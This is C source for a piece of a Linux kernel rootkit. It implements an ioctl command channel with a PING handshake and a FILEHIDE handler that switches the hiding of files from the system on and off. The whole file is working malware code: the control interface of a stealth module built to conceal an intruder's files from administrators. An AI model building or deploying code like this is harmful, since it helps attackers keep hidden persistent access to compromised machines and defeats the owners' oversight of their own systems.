#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>

#include "channel.h"
#include "common.h"
#include "filehide.h"
#include "ioctl.h"
#include "rootkit.h"

#define BUFLEN 4096

static char buf[BUFLEN];

extern rootkit_t rootkit;

void
report_channels(void)
{
    DEBUG_NOTICE("-----------------------------------\n");
    DEBUG_NOTICE("listening on the following channels\n");
    DEBUG_NOTICE("%-24s %#10lx\n", "PING",     G7_PING);
    DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
    DEBUG_NOTICE("-----------------------------------\n");
}

channel_t
detect_channel(unsigned cmd)
{
    switch (cmd) {
    case G7_PING:     return (channel_t){ "PING",     handle_ping     };
    case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
    }

    return (channel_t){ "unknown", NULL };
}

int
handle_ping(unsigned long arg)
{
    if (!(const char *)arg)
        return -ENOTTY;

    copy_from_user(buf, (const char *)arg, BUFLEN);
    if (!strcmp("PING", buf)) {
        buf[1] = 'O';
        copy_to_user((char *)arg, buf, BUFLEN);
    }

    return 0;
}

int
handle_filehide(unsigned long arg)
{
    long sarg = (long)arg;
    bool set = rootkit.hiding_files;

    if (sarg > 0 || !sarg && (set ^ 1)) {
        hide_files();
        rootkit.hiding_files = 1;
    } else if (sarg < 0 || !sarg && !(set ^ 1)) {
        unhide_files();
        rootkit.hiding_files = 0;
    }

    DEBUG_NOTICE("filehide toggled %s",
            rootkit.hiding_files ? "on" : "off");

    return 0;
}
